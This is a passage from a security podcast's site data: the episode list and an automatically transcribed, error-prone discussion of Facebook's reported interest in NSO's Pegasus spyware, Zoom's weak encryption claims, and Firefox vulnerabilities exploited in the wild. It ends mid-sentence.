who ate or possibly a little bit later Eastern Standard time tomorrow so you know tune into that if you're certain that but we'll wrap up the show here thanks to everyone who tuned in you can catch the vods on Twitch right now or YouTube 24 hours after the stream also 24 hours out of the stream we have the previous podcasts up on Spotify Apple podcast Google podcasts all the pretty much anywhere you can get a podcast we have not there\", \"start\": 8963.1}, {\"speaker\": 3, \"line\": \" lad if you listen to podcast somewhere else we're not on there definitely let us know I do I platforms if we need to yeah I think we've hit all the big ones though\", \"start\": 9018.8}], \"speakers\": {\"1\": \"Specter\", \"2\": \"Anti\", \"3\": \"zi\"}, \"offset\": \"0\", \"youtube\": \"ys1dU_Xd3cE\"}\nTRANSCRIPT--><!--kg-card-end: html-->","slug":"episode-38"}},{"node":{"title":"Episode 36 - Zoom-ers, VM Escapes, and Pegasus Resurfaces","path":"/posts/episode-36/","date":"8 April 2020","description":"First, we talk about Facebook trying to buy some spyware, and then we feast upon a number of Zoom \"vulns.\" Follow that up wtih some interesting vulnerabilities including a hyper-visor Guest-to-host escape, a complicated Safari permissions bypass, and a Gitlab Parser Differential.","content":"<!--kg-card-begin: html--><iframe width=\"560\" height=\"315\" src=\"https://www.youtube.com/embed/0NS8tgeid9M\" frameborder=\"0\" allow=\"accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture\" allowfullscreen></iframe>\n<hr />\n<p>First, we talk about Facebook trying to buy some spyware, and then we feast upon a number of Zoom \"vulns.\" Follow that up wtih some interesting vulnerabilities including a hyper-visor Guest-to-host escape, a complicated Safari permissions bypass, and a Gitlab Parser Differential.</p>\n<p>&nbsp;</p>\n<ul>\n<li>[<a href=\"https://www.youtube.com/watch?v=0NS8tgeid9M&t=579\">00:09:39</a>] <a href=\"https://appleinsider.com/articles/20/04/03/facebook-tried-to-buy-nso-groups-ios-spyware-to-monitor-iphone-users\">Facebook tried to buy NSO Group's iOS spyware to monitor iPhone users</a><br />\n\t<ul></ul></li>\n<li>[<a href=\"https://www.youtube.com/watch?v=0NS8tgeid9M&t=897\">00:14:57</a>] <a href=\"https://citizenlab.ca/2020/04/move-fast-roll-your-own-crypto-a-quick-look-at-the-confidentiality-of-zoom-meetings/\">Move Fast & Roll Your Own Crypto: A Quick Look at the Confidentiality of Zoom Meetings</a><br />\n\t<ul></ul></li>\n<li>[<a href=\"https://www.youtube.com/watch?v=0NS8tgeid9M&t=1716\">00:28:36</a>] <a href=\"https://www.mozilla.org/en-US/security/advisories/mfsa2020-11/\">Security Vulnerabilities fixed in Firefox 74.0.1 and Firefox ESR 68.6.1</a><br />\n\t<ul></ul></li>\n<li>[<a href=\"https://www.youtube.com/watch?v=0NS8tgeid9M&t=2008\">00:33:28</a>] <a href=\"https://www.csoonline.com/article/3535888/bug-bounty-platforms-buy-researcher-silence-violate-labor-laws-critics-say.html\">Bug bounty platforms buy researcher silence, violate labor laws, critics say</a><br />\n\t<ul></ul></li>\n<li>[<a href=\"https://www.youtube.com/watch?v=0NS8tgeid9M&t=3244\">00:54:04</a>] <a href=\"https://twitter.com/_g0dmode/status/1242131019026874369\">Zoom NTLM Hash Leak</a><br />\n\t<ul></ul></li>\n<li>[<a href=\"https://www.youtube.com/watch?v=0NS8tgeid9M&t=3592\">00:59:52</a>] <a href=\"https://objective-see.com/blog/blog_0x56.html\">The 'S' in Zoom, Stands for Security</a><br />\n\t<ul></ul></li>\n<li>[<a href=\"https://www.youtube.com/watch?v=0NS8tgeid9M&t=3960\">01:06:00</a>] <a href=\"https://www.thezdi.com/blog/2020/4/1/cve-2020-3947-use-after-free-vulnerability-in-the-vmware-workstation-dhcp-component\">Use-After-Free Vulnerability in the VMware Workstation DHCP Component [CVE-2020-3947]</a><br />\n\t<ul><li><a href=\"https://www.vmware.com/security/advisories/VMSA-2020-0004.html\">https://www.vmware.com/security/advisories/VMSA-2020-0004.html</a><br /></li><li><a href=\"https://www.zerodayinitiative.com/advisories/ZDI-20-298/\">https://www.zerodayinitiative.com/advisories/ZDI-20-298/</a><br /></li></ul></li>\n<li>[<a href=\"https://www.youtube.com/watch?v=0NS8tgeid9M&t=4546\">01:15:46</a>] <a href=\"https://blog.zecops.com/vulnerabilities/exploiting-smbghost-cve-2020-0796-for-a-local-privilege-escalation-writeup-and-poc/\">Exploiting SMBGhost for a Local Privilege Escalation [CVE-2020-0796]</a><br />\n\t<ul></ul></li>\n<li>[<a href=\"https://www.youtube.com/watch?v=0NS8tgeid9M&t=5199\">01:26:39</a>] <a href=\"https://about.gitlab.com/blog/2020/03/30/how-to-exploit-parser-differentials/\">How to exploit parser differentials</a><br />\n\t<ul></ul></li>\n<li>[<a href=\"https://www.youtube.com/watch?v=0NS8tgeid9M&t=5835\">01:37:15</a>] <a href=\"https://www.ryanpickren.com/webcam-hacking\">Unauthorized Camera access on iOS and macOS</a><br />\n\t<ul></ul></li>\n<li>[<a href=\"https://www.youtube.com/watch?v=0NS8tgeid9M&t=6555\">01:49:15</a>] <a href=\"https://hackerone.com/reports/784714\">[Slack] Relative Path Vulnerability Results in Arbitrary Command Execution/Privilege Escalation</a><br />\n\t<ul></ul></li>\n<li>[<a href=\"https://www.youtube.com/watch?v=0NS8tgeid9M&t=6869\">01:54:29</a>] <a href=\"https://arxiv.org/pdf/2004.00543v2.pdf\">Physically Realizable Adversarial Examples for LiDAR Object Detection</a><br />\n\t<ul></ul></li>\n<li>[<a href=\"https://www.youtube.com/watch?v=0NS8tgeid9M&t=7307\">02:01:47</a>] <a href=\"https://www.microsoft.com/security/blog/2020/04/02/attack-matrix-kubernetes/\">Attack matrix for Kubernetes</a><br />\n\t<ul></ul></li>\n<li>[<a href=\"https://www.youtube.com/watch?v=0NS8tgeid9M&t=7422\">02:03:42</a>] <a href=\"https://googleprojectzero.blogspot.com/2020/04/tfw-you-get-really-excited-you-patch.html\">Project Zero: TFW you-get-really-excited-you-patch-diffed-a-0day-used-in-the-wild-but-then-find-out-it-is-the-wrong-vuln</a><br />\n\t<ul></ul></li>\n<li>[<a href=\"https://www.youtube.com/watch?v=0NS8tgeid9M&t=7461\">02:04:21</a>] <a href=\"http://phrack.org/papers/escaping_from_freebsd_bhyve.html\">Tale of two hypervisor bugs - Escaping from FreeBSD bhyve</a><br />\n\t<ul></ul></li>\n<li>[<a href=\"https://www.youtube.com/watch?v=0NS8tgeid9M&t=7709\">02:08:29</a>] <a href=\"https://portswigger.net/research/so-you-want-to-be-a-web-security-researcher\">So you want to be a web security researcher?</a><br />\n\t<ul></ul></li>\n</ul>\n<p>Watch the DAY[0] podcast live on <a href=\"https://www.twitch.tv/dayzerosec\">Twitch (@dayzerosec)</a> every Monday afternoon at 12:00pm PST (3:00pm EST)</p>\n<!--TRANSCRIPT\n{\"transcript\": [{\"speaker\": 3, \"line\": \" Hello everyone. Welcome to another episode of the day Zero podcast. You may notice we've picked up a fossil on our way to the podcast today anti is back with us. So I'm Specter with me as e and anti as well, which is nice to be able to say after a long while though. He is only with us for about 30 minutes or so. He's going to have to bail out and do some stuff. So, you know, we haven't for a little bit but not for the full episode but we've got quite a Content packed episode today in terms of topics. So yeah, let's just get right into the first one. So there was an article on Facebook about buying the Pegasus exploit So for anybody is from song go\", \"start\": 8.2}, {\"speaker\": 1, \"line\": \" if on Apple Insider about Facebook, yeah just clarify\", \"start\": 47.2}, {\"speaker\": 3, \"line\": \" that. Yeah, so obviously, I mean this this group NSO has been known to sell spyware in the past to nation-states and stuff like that. But the CEO of the NSO group basically said that Facebook asked to purchase the rights of capabilities. From Pegasus. So according to the CEO Facebook was interested in Pegasus because they had their own app called and overprotect Anova protect, which I think we covered before back when like know what the new we were comforted. We\", \"start\": 52.6}, {\"speaker\": 1, \"line\": \" covered on Facebook research which was kind of like, so an oval protect was banned from the apps Apple App Store and like somewhere in 2019, so to this happened this evening. Event happened with Facebook reaching out to buy some functionality of Pegasus happen in 2017, 2019 and overprotect was banned sometime last year. I think it was during the summer. It was also removed from the Google Play store which then led into Facebook research, which was that bpn that they kind of targeted towards or apparently or allegedly targeted towards teens and they would pay them like 20 bucks a month or whatever. Actually they might have targeted like a Team plus teens not not like 13 to 18. I'm not sure of the details on that but it is slightly different in terms of what type of information it was tracking things like that.\", \"start\": 84.3}, {\"speaker\": 3, \"line\": \" Yeah, so, you know according to the CEO they had went to by the you know by capabilities of Pegasus and apparently it was because they were worried that their app was less effective on iOS compared to Android which makes sense because iOS is like a lot more locked down in terms of privacy barriers and stuff like that than Android typically Facebook of you know, they kind of contradict this they say they're saying statement is meant to distract people from the fact that Facebook is suing in a so which they started like happy. Go for exploiting vulnerabilities and WhatsApp, but what I found interesting was they didn't outright deny the lake allegation. They just kind of said that oh, this is just to distract you from the fact that we're suing them but like, you know, it's weird. They don't outright deny it.\", \"start\": 143.8}, {\"speaker\": 1, \"line\": \" Yeah. Well, I mean, they probably it probably did happen. But the thing is it's unrelated to the fact that they're suing going to so group over the voice exploits and WhatsApp. Yeah, they're suing over one thing. It's kind of unreal a over the facto. Well Facebook also want to buy it is unrelated. So, I mean the fact that Facebook isn't denying get I mean,\", \"start\": 189.7}, {\"speaker\": 3, \"line\": \" I mean, it's hard to get Facebook the the benefit of the doubt after all the stuff they've been involved with\", \"start\": 214.8}, {\"speaker\": 1, \"line\": \" well, I don't think they need the benefit of the doubt. They very well could have tried to buy it. Yeah, I mean and there's not necessarily anything wrong with that. I mean people are immediately going to the facto. Well Facebook's I just tried twist I think anti had some thoughts on this. That's why we had brought him on.\", \"start\": 220.1}, {\"speaker\": 3, \"line\": \" Yeah. No, I mean, I guess I don't know. I mean I looked over the article and I thought you know, the two interesting parts were like the timeline, you know, like the 2017 when they first sounds like approach them to buy, you know, the specific stuff for a novel or only. However, you pronounce it protect. So I think you know what's kind of weird is, you know the timing I probably agree with Facebook and that they're probably Doing it just because they're being sued. So it's perfect, you know kind of cannon fodder but like I think the weird part is now that they're suing them like my weird Twitchy response is that maybe you know, if I had to guess the sounds like something that Facebook was investigating and probably heard about again the exploits that are available so on so forth and was like, well, how do we go and approach this group without seeming like we're investigating them, you know, so what better way than to go and kind of push for something that you're doing and go and say hey,\", \"start\": 238.3}, {\"speaker\": 2, \"line\": \" We'd like to use this to see if\", \"start\": 292.5}, {\"speaker\": 3, \"line\": \" we can further our capability. You know, some part of me just believes that it was like kind of a way to probably you know, still Leverage What they'd find from the NSO group, but also be able to fill those kind of like holes in their capabilities. Does that kind of make sense?\", \"start\": 293.9}, {\"speaker\": 1, \"line\": \" Yeah. Well and I kind of agree with you it does seem like you know, Facebook's a company that's already spending a lot of time trying to track you and trying to get information. Can you make yourself auntie? We're getting some background noise. So Facebook's already spending a lot of time trying to gather a lot of information. No doubt. They have a lot of very smart people trying to do. So so it does seem a little bit suspicious that they're coming to NSO group to try and track users. I like it just feels like this is something that Facebook should probably are probably does already know and that as you were saying there's probably another reason that led to them actually approaching anti so group and I think a very well could have been related to them trying to get like threat Intelligence on what and a so group was doing rather than it being relate to them actually wanting to utilize the techniques out of the malware.\", \"start\": 310.3}, {\"speaker\": 3, \"line\": \" So You think it's a less malicious in nature than it\", \"start\": 370.4}, {\"speaker\": 1, \"line\": \" seems. I'm willing to give Facebook that benefit of the doubt in a sense. That I don't think Facebook was looking to just start spreading spyware. I mean, I think that that just doesn't at least to me it doesn't really fit with and I'm not saying like Facebook is this completely trustworthy company or anything? It's just as a legitimate company. It doesn't seem likely to me that they were looking to actually, you know, just start using spyware and to be clear. They do only asked to use parts of Pegasus. Not the entire thing.\", \"start\": 373.3}, {\"speaker\": 3, \"line\": \" I mean it's worth noting that they also are worth how many billions of dollars you know, and their whole business model is built on you no not spying on user but collecting data on their user. So I'd be surprised to feel like they need to go to a group like NSO group to figure out ways to do that. You know, it just seems a little silly not to say that it isn't something they could have done but you know the more we look at it the more it just seems like why would they even need to go that bar? It'd be a perfect guys though to be able to say. Hey. Eat it for you know, the Privacy aspect we can't get through some of these controls but it is totally possible to to fare as well that they maybe didn't have that capability.\", \"start\": 413.5}, {\"speaker\": 1, \"line\": \" Yeah, I know but\", \"start\": 451.9}, {\"speaker\": 3, \"line\": \" I kind of feel like a lot of people are leaving Facebook with all the pr like, you know battles that they've had with over the past couple years of all the stuff they've tried to pull like with the VPN app, for example that we were talking about earlier. I mean, I think they are having a harder time now collecting the data that they used to be able to collect so it does seem possible that they would want to go that like extra step to try to get more data where they couldn't they can't get as much now as they could\", \"start\": 454.3}, {\"speaker\": 1, \"line\": \" before. Yeah, but this kind of monster was in 2017, though. Like this wasn't like for. Yeah, but approach that. Now this\", \"start\": 481.4}, {\"speaker\": 3, \"line\": \" is was still kind of like\", \"start\": 488.2}, {\"speaker\": 1, \"line\": \" Facebook had a lot of facts is because they still had their own overprotect on the app store which gave them a ton of access. It was in 2019 that Apple changed their terms that stopped allowing basically stopped along Facebook actually no information about like what apps are running and all that detailed information that they would have wanted to collect. So if this were more recent, but in 2017 I mean, they would have had a lot of this information just from the people already installing their application and I mean, could you imagine what would happen if it were found out that Facebook was legitimately just installing malware.\", \"start\": 490.0}, {\"speaker\": 3, \"line\": \" They've already done.\", \"start\": 534.8}, {\"speaker\": 1, \"line\": \" It is in terms of the Outlook from pretty much everybody because if you find out oh Facebook's\", \"start\": 536.6}, {\"speaker\": 3, \"line\": \" just you know, Facebook's\", \"start\": 543.2}, {\"speaker\": 1, \"line\": \" collecting a lot of information you're using their application. There's a I want to say implied consent when you start using Facebook, obviously, there's a ton of websites that tend to include Facebook. Like there's a lot of tracking and information that they're able to get without that. But basically as a legitimate company, I'm not expecting Facebook to go about breaking the law. And actually jailbreak some random person devices which Pegasus does being given a link through methods mentioned writing the document I using paying cyst, you know results in the Target device being jailbroken and the mail were being loaded to Modern steel data. It's one thing for Facebook to be collecting information. It's a completely different thing for Facebooked actually do so in a criminal in a alright.\", \"start\": 545.7}, {\"speaker\": 3, \"line\": \" Manner, but I guess my question is if they were doing this for thread until like you're saying I mean, how does this really help them in any way? Like, what are they going to do with that?\", \"start\": 590.1}, {\"speaker\": 1, \"line\": \" It's being aware of exploits being used against them would be one case\", \"start\": 601.2}, {\"speaker\": 3, \"line\": \" but I guess this was already known like\", \"start\": 606.5}, {\"speaker\": 1, \"line\": \" Pegasus was knowing not necessarily all the details in 2017. I'm glad assume that they Continue to update Pegasus. I can't imagine that they use the same exploits now that they use in 2017 or they'd be using the same exploits in 2017 that they were using in 2015 or 2016 or not me. This is something that NSO groups continuing to sell. I have to assume that part of this process includes, you know updates\", \"start\": 608.5}, {\"speaker\": 3, \"line\": \" but those Let's Plays don't affect Facebook. Like that's why I moved to sit up that we're\", \"start\": 639.0}, {\"speaker\": 1, \"line\": \" gonna so group was using attacks on WhatsApp though, which does\", \"start\": 643.1}, {\"speaker\": 3, \"line\": \" involve Okay. Yeah, that's true. It's good. Yeah fair enough. I'm sorry. I thought you were gonna say something. No, it's good. I think I was just about to see what he said basically is that you know, like wow, it doesn't directly go after them. Didn't they have capability to scrape, you know users information from at least WhatsApp and you know, they may not have told the public their capabilities right up the way so they may have had you know functionality to steal Facebook stuff and you know other products blowing into Facebook. So I mean, I just the simple part of it though is I find it funny weirdly enough that it ever agree with face. A book on the fact that you know, it's weird that they would sell me throw this out there when they knew years ago that it was such an issue. You know, I do find it weird. Also though that if Facebook was trying to you know, go and find more private information of their users, you know, it's like going to try and protect your house with security cameras are being like actually I'm going to go to the Colombian drug cartels and by AK-47s to protect myself that like, it's such a weird Step 2. It doesn't make sense.\", \"start\": 647.3}, {\"speaker\": 1, \"line\": \" Yeah. I don't know so obviously I don't\", \"start\": 706.1}, {\"speaker\": 2, \"line\": \" want Earth\", \"start\": 707.9}, {\"speaker\": 1, \"line\": \" can threat intelligence. So perhaps you'll correct me on this but it feels like it would be kind of up their alley if say Facebook's internal threat team. It just finds out that an assault groups may be doing something against Facebook. Now, I'm actually going to walk back my prior statement. It wouldn't make a lot of sense if NSL group were actually like had exploits are earning Facebook that they would then sell those exploits the Facebook. So I'm going to walk back onto my statement on that. That odds are they weren't going for help. We're necessarily looking for that because if they were they would probably approach and a so group under the cover of some other.\", \"start\": 708.4}, {\"speaker\": 3, \"line\": \" Throat, sorry know what they could have. No, you think could have gone over it a billion ways. I mean the the idea of threat intelligence rights to to stop threats and like some companies like Facebook are probably a little fast and loose with it. So they come up with some koi idea of like a let's go and tell him it's just for this. I mean I if I had to guess the way they wanted it to pan out was that they were probably going to get in there first off. They may have taken the capabilities and may have very well done that to spy on users more and stuff like that, but I think it also could have one of those things that you know NSO group if they sign up Facebook as a client. It's kind of awkward to them be offering functionality to steal your clients crap. Like, you know, you can't you can't be like, oh well now our latest version of this Mauer that we've created steals Facebook user accounts or Whatsapp. Like it's probably a little more sketchy on that end. So they it could have been just a weird roundabout way to get them to stop targeting Facebook and it's you know other companies if you think about it\", \"start\": 749.4}, {\"speaker\": 1, \"line\": \" could have been I mean the thing is Facebook does have a lot of money. Throw around to your so that that kind of just ties in with Azure say like being a little bit fast and loose on that and we'll just come up with some idea and give it a try. I don't know how much money actually goes towards thread until with Facebook but given kind of the size of Facebook. I wouldn't be surprised to find out if there's a pretty substantial amount there. But honestly, I made it on a whole idea. I do agree with you on today feels weird like this is the timing friend is So group releasing that information, obviously, it's released as part of the Court. Court documents so it's not like, you know NSL group just like did immediately could but I don't know to me looking at from the outside. I'm not a lawyer. I don't know the intimate details here. It does feel more or less unrelated only showing that maybe they had a client relationship with Facebook.\", \"start\": 805.4}, {\"speaker\": 3, \"line\": \" It seems like they just want to get a shot in the\", \"start\": 866.2}, {\"speaker\": 1, \"line\": \" face. Yeah. Yeah, definitely.\", \"start\": 867.8}, {\"speaker\": 3, \"line\": \" Yeah, I mean obviously like a lot of the stuff. I've been talking about is speculation. We don't know like all the hard details. Maybe we will see more come out through that lawsuit like in the future. I don't know but yeah, it is like kind of a weird story. Maybe we'll find out more later. That being said, I think we can move on to some Zoomer stuff. So Zoom, is that some pretty bad PR over the last week and this is the first of many courses related to our Feast on zoom in this episode and part of the reason Zoom has gotten so much attention lately is do Self-isolation with you know current world events. It's being used a lot by companies and governments and lots of other places for meetings. So Zoom has had security incidents in the past. So, you know researchers have started looking at it more closely do it being used so much lately and these researchers discovered some issues and that's because Zoom seems to have some disingenuous claims related to crypto that are either not don't seem to be true at all or seem to be misleading\", \"start\": 870.6}, {\"speaker\": 1, \"line\": \" disingenuous or possibly just misunderstanding like written by somebody that doesn't understand that spot like Mark marketing may be doing a lot of fat and and I come at that just because they talk about some one of the things brought up in this is end-to-end encryption Zoom claims are has claims about their end-to-end encryption and like immediately following those claims. Zoom ends up talking about like TLS being used which TLS is definitely crypto, but it generally speaking like anti end is going to be a par from your standard TLS. I'm trying to find the picture. I'm thinking of in the document. But\", \"start\": 934.6}, {\"speaker\": 3, \"line\": \" but I think the other issue is only the key exchange happens over TLS. I don't even think the the actual packet exchange happens over TLS. My am I wrong on that or\", \"start\": 983.1}, {\"speaker\": 1, \"line\": \" I'd have to look into it. But I have to imagine that if the kazoom does have a web interface, so it's going to have to be over http.\", \"start\": 993.8}, {\"speaker\": 3, \"line\": \" So here's the here's the like diagram I was looking at so they have observing a test Zoom call. I don't know if it's scroll down for you, but they have like get ski over TLs, but then the meeting it says it's encrypted with AES over UDP, but\", \"start\": 1002.0}, {\"speaker\": 1, \"line\": \" like, okay, so that's that's a separate\", \"start\": 1018.1}, {\"speaker\": 3, \"line\": \" from it. Yes key is not like end-to-end encryption.\", \"start\": 1020.0}, {\"speaker\": 1, \"line\": \" Yeah. No, like their whole end-to-end encryption is definitely wrong but seems like it's just somebody that doesn't understand what intend encryption actually is. And that could be intentionally misleading or could not other things that are mentioned in here are the they're using AES 256 in reality. It looks like they're using AES 128 and they're using ECB mode. If you're not familiar with the ECB mode actually they have the classic picture in this article classic picture is based with ECB mode. It takes a key and basically just applies. Is it to the block so a s is a cipher or block Cipher? Sorry, it's going to say Cipher block, but it's a block Cipher. So what happens is it splits up whatever your messages whatever you want encoded it gets split up into equal sized blocks and then the key wouldn't you could apply the key in several different ways. You could for example apply the key to the first block and then apply the second block to the following block and kind of chain them along ECB mode basically takes the key. Applies it to the block as so there's no connection between any of the following blocks? So what ends up happening is you end up with these pad if you have patterns in your data is two blocks are the same the resulting ciphertext will be the same. So that's only really an issue if you have data that's going to be repeating. So the classic example is this very much like uncompressed bitmap of the tux penguin. And you'll notice even when it's encrypted if you're able to see our video that you can kind of make out the outline of top so you can see kind of the original image or parts of the original image, even though it's technically encrypted. So that's why ECB mode is a problem. But the reality is when we were talking about audio odds are you're not having a lot of that sort of completely repeating blocks, you know, people are going to speak definitely the audio data is going to be continually changing. So there are things that could be Pulled out you can get information such as Cadence of packets kind of decadence of what's being spoken. There are definitely things that you can leak because of ECB mode but the risk isn't huge in a lot of cases with these female. Again, the problem with ECB is less ACB and more the fact that if you're using it odds are ECB is not the most significant problem in your crypto.\", \"start\": 1024.2}, {\"speaker\": 3, \"line\": \" It's a code smell Birds the crypto\", \"start\": 1182.2}, {\"speaker\": 1, \"line\": \" quibble. It's definitely an issue. It's generally an issue because we use it's the easiest block mode to use pretty much all the other options require some other settings usually like an initialization Vector that would just be like some starting value so that every every encrypted instant sins up starting different and so they'll always kind of be different even when data is the same. So you'll use an IV for that. They need some further data. Whereas doing ECB mode. You need a key and you need the data. It's kind of that classic what you think of crypto if you don't really understand how crypto works. It's like you think that's what you need the data. You need a key. So people who end up use that tend to be the type of people who don't really know the difference. They just know what they want. They want this crypto therefore they use the easiest thing\", \"start\": 1184.4}, {\"speaker\": 3, \"line\": \" available. Yeah, so there was also another issue that they said they discovered in the waiting room feature, but they're not disclosing it yet because they want to wait until it's fixed because of the risk, it could pose to users but they said they are going to disclose it when it's been fixed and everything. So we may see that on like a future episode we can go a little bit more to the specific specifics of that issue. I think with the most worrying part of this article was was the Shady bindings where the keys were actually being sent through.\", \"start\": 1238.6}, {\"speaker\": 2, \"line\": \" He\", \"start\": 1270.6}, {\"speaker\": 3, \"line\": \" servers even when none of meeting participants nor the company hosting the meeting were based in China. So they give an example of a test between a user from the US and from Canada and the key ended up making its way through to one of the participants through Beijing server. And what makes this really suspect is trying to can make it so that Zoom is legally obligated to disclose those keys to Chinese authorities. So I which\", \"start\": 1270.7}, {\"speaker\": 1, \"line\": \" is the beauty about when you hear the key going through there and we know it's not I intend encrypted and to be fair I am going to mention so I've used Zoom a fair bet well prior to this. I never realized I didn't even realize they made the claim of being anti and encrypted. Basically, they can't be anti and encrypted and I will mention that out. Right like they can't do EET simply because you can call into it. Like literally call it was so because of that. There's no way you could do end-to-end encryption Zoom needs to be able to decrypt act in order to let people call\", \"start\": 1296.3}, {\"speaker\": 3, \"line\": \" in. Yeah, but considering Zoom is being used by governments and stuff like that. You know, the fact that those keys are being routed through Chinese servers when nobody's in those meetings in China is like I think it's probably the most worrisome part of the article.\", \"start\": 1333.6}, {\"speaker\": 1, \"line\": \" Yeah. It does seem a little bit just like a poor routing Choice rather than necessarily A designed to go through China that said it's absolutely sketchy. I mean it could there could be a benign reason and apparently Zoom has updated this such that it no longer.\", \"start\": 1348.4}, {\"speaker\": 3, \"line\": \" What do you\", \"start\": 1365.9}, {\"speaker\": 1, \"line\": \" got to but\", \"start\": 1366.2}, {\"speaker\": 3, \"line\": \" is there no way they could like? I don't know do a few more test cases just to show like is only one time and then they showed like okay, it's going through China or you know,\", \"start\": 1368.6}, {\"speaker\": 1, \"line\": \" it's the thing. I think they had to make multiple attempts until one actually went through trying to it wasn't every key going through China. They don't make their claim. Isn't that hard?\", \"start\": 1377.3}, {\"speaker\": 3, \"line\": \" Okay. That's all I'm saying is like, you know, if it was every single key than a big. Wow. That's\", \"start\": 1386.8}, {\"speaker\": 1, \"line\": \" oh I'd be way more concerned about it. Then goes every\", \"start\": 1390.9}, {\"speaker\": 3, \"line\": \" to like, oops did we And every key to ourselves damn it, we do that every time like, you know that I would have been like, all right.\", \"start\": 1393.8}, {\"speaker\": 1, \"line\": \" Well, so it seems like all the keys originated from Zoom. So it's not even sending it to themselves because they generate the key.\", \"start\": 1401.0}, {\"speaker\": 3, \"line\": \" Yeah. So I mean, I feel like the most creepy part. I mean if anyone wants a good chuckle to themselves the thread until twittersphere has fought itself over and over again the past couple weeks about like if these things are truly bad or if it's a bunch of people just being a holes, you know,\", \"start\": 1407.6}, {\"speaker\": 1, \"line\": \" because there's absolutely Cloud chasing way. It comes to zoom right\", \"start\": 1423.4}, {\"speaker\": 3, \"line\": \" now. Yeah, we'll get into that a bit later. I'm sad that I can't be there for it. But I will say I've seen it all over the place on that. I do feel bad that while I don't trust Zoom my company even pushed out that we all had to uninstall it and we migrated something else, you know, it's kind of fascinating to see people pile on it. But, you know at the end of the day like what other things can you use at this point that has any consistency? Like I know people mentioned like Gypsy and other I think it's only when I really hurt\", \"start\": 1426.5}, {\"speaker\": 1, \"line\": \" Curiously, what is it Apache open\", \"start\": 1455.7}, {\"speaker\": 3, \"line\": \" meetings? No, Apache. Oh, I mean yeah, I'm sure that's a very crowd favorite nowadays. You can Google Hangouts. I mean, you know, did we, you know, you\", \"start\": 1458.1}, {\"speaker\": 1, \"line\": \" just well, I mean if you're consuming exactly\", \"start\": 1469.6}, {\"speaker\": 3, \"line\": \" that's fine, you know, but I mean which ones really worse I did like the I did like the photo from the team locks changed over to the ECB mode. That's probably the only like good example by its weak, but I did want to point out. It's a lot harder to reconstruct. Audio, then it is like a photo or something like that that you kind of mentioned zi like\", \"start\": 1474.5}, {\"speaker\": 1, \"line\": \" yeah that tells getting at doing audio like this sort of attack isn't huge against the out. There are other piece of metadata information you can pull out but the key issue with ECB is really when you have this sort of repeating\", \"start\": 1494.1}, {\"speaker\": 3, \"line\": \" data. Yeah, so now I just thought that was a good point. And so hopefully, you know, the only anecdotal thing that I thought was the best of all of it was that the was a Boris Johnson. He was him and his crew were having a nice call of resume, but he left the zoom meeting ID for everyone and you know besides all the zoom bombing nonsense. I thought that must be pretty good if they are really scraping all these keys and decrypting Converse conversations that it must be fantastic just to have some so easily. Where to target the mat that must have been a real Joy.\", \"start\": 1507.9}, {\"speaker\": 1, \"line\": \" Well, so I believe the meeting ID was tweeted after the meeting actually happened that said obviously meeting ideas can be\", \"start\": 1542.1}, {\"speaker\": 3, \"line\": \" reused\", \"start\": 1549.9}, {\"speaker\": 1, \"line\": \" but I believe it was true. It was tweeted out by somebody else. Obviously, I wasn't actually tweeted out by Boris Johnson was taken down by yeah, whoever, you know, whoever does social media where it it\", \"start\": 1552.4}, {\"speaker\": 3, \"line\": \" doesn't have to be you. It's always Be part of your crew, you know, it's the one that seeks, you\", \"start\": 1567.7}, {\"speaker\": 1, \"line\": \" know, I just mean like with that. It happened after the fact that happened after the meeting right? I don't believe it happened during maybe I'm mistaken on that. But I remember it kind of coming up on its own.\", \"start\": 1571.3}, {\"speaker\": 3, \"line\": \" Well, I'll before I jump off here. I'll give my final resting statements on it so that you guys can crap on them later. Well, I did want to ask you one more thing anti if so, would you be able to stay on for like a few more minutes? Yeah. Yeah. Okay, the the people who kidnapped me will take the gun away.\", \"start\": 1584.5}, {\"speaker\": 1, \"line\": \" Can\", \"start\": 1599.3}, {\"speaker\": 3, \"line\": \" sign okay but yeah, you can give your finishing thoughts on that, but I did have one other thing. I wanted to bring up with a different topic as well. But yeah you go ahead. Yeah. Sure. No. No, I'll let you if you have any other questions on any other topics for I go I'm happy to answer them. Um, no, I was just going to say, you know, since the people of crap Emma so much Zoom for a lot of reasons sucks and I don't like you I don't trust it. But at the same time like I do feel bad that I guess in New York, the things the governor for schools that they can't use zoom in. Anymore because of the concerns but I mean, I haven't seen like a of all the campaign's that I currently wash and you know, I don't see anyone targeting Zoom the way that people will blow it up. So I feel bad genuinely that even as a Chinese company, they probably are sketchy a little bit, but I don't know if they definitely deserve like the widespread hey of like, you know, these guys are still in your keys to crypting a conversation. Like I doubt they care really and I think for the most part they just didn't expect so many people to start using it, but I don't know I just feel bad.\", \"start\": 1599.5}, {\"speaker\": 1, \"line\": \" Yeah. Mentioned actually they have blog posts with just their insane growth recently. I forget what the numbers are but it was very significant usage. Now. That's that I won't mention they own some Chinese companies. I don't believe I believe they are like Zoom itself is a registered company in the u.s. Though.\", \"start\": 1658.8}, {\"speaker\": 3, \"line\": \" Yeah, they're us company and they own some Chinese companies. And so, you know as with all analyses if it is if there's anything China on it, it's like almost be like a Chinese apt group or something. Well China hasn't given any like the Chinese government hasn't given anybody any reason to give them the benefit of the doubt with any anything they're connected with so never heard them do anything bad to anyone. Okay, you can take that to the bank. Please. Don't kill me how much money get paid. But anyway, I'm gonna do a last-minute topics which are just because you do have to go here in a few minutes. I wanted to bring up the Mozilla advisory. So there's not too much to talk about here because the technical details are actually locked off, but there were there were some security vulnerabilities that were About Firefox one was a use after free through race condition and the NS stock shell the destructor and the other one was another race condition yielding use after free when handling a readable stream. So, you know, these are obviously they're both Firefox issues. We don't have the technical details and I think those bug references are probably going to be locked off forever. I don't think Mozilla ever opens them up to the public. But what made this notable was they noted that the targeted attacks. There's targeted attacks in the Old that are abusing these vulnerabilities and I think I thought that was interesting to see on Firefox because typically when you see that notice on browsers, it's Safari or Chrome because those are the default browsers on mobile operating systems. So I think it's interesting to see targeted attacks hitting Firefox where Firefox doesn't necessarily have the greatest market share when you're talking about browsers. So I was wondering anti do you think this could possibly be targeted the tax on Tor users? Because I know Tory uses Firefox under the hood right\", \"start\": 1678.0}, {\"speaker\": 1, \"line\": \" yes it does Tor Browser does technically you create you can use other browsers\", \"start\": 1781.3}, {\"speaker\": 3, \"line\": \" yes by default the Tor Browser that everyone gets is using Firefox has its base right now are so you're asking specifically if it's likely that is towards towards users or just in general targeting people yeah I was just wondering if like you think that these attacks that are using these vulnerabilities could be going after like Tor users it's like you know slow let's say journalist potentially using a tour for anonymity or something like that heylia dude are you kidding me I mean now I can't say 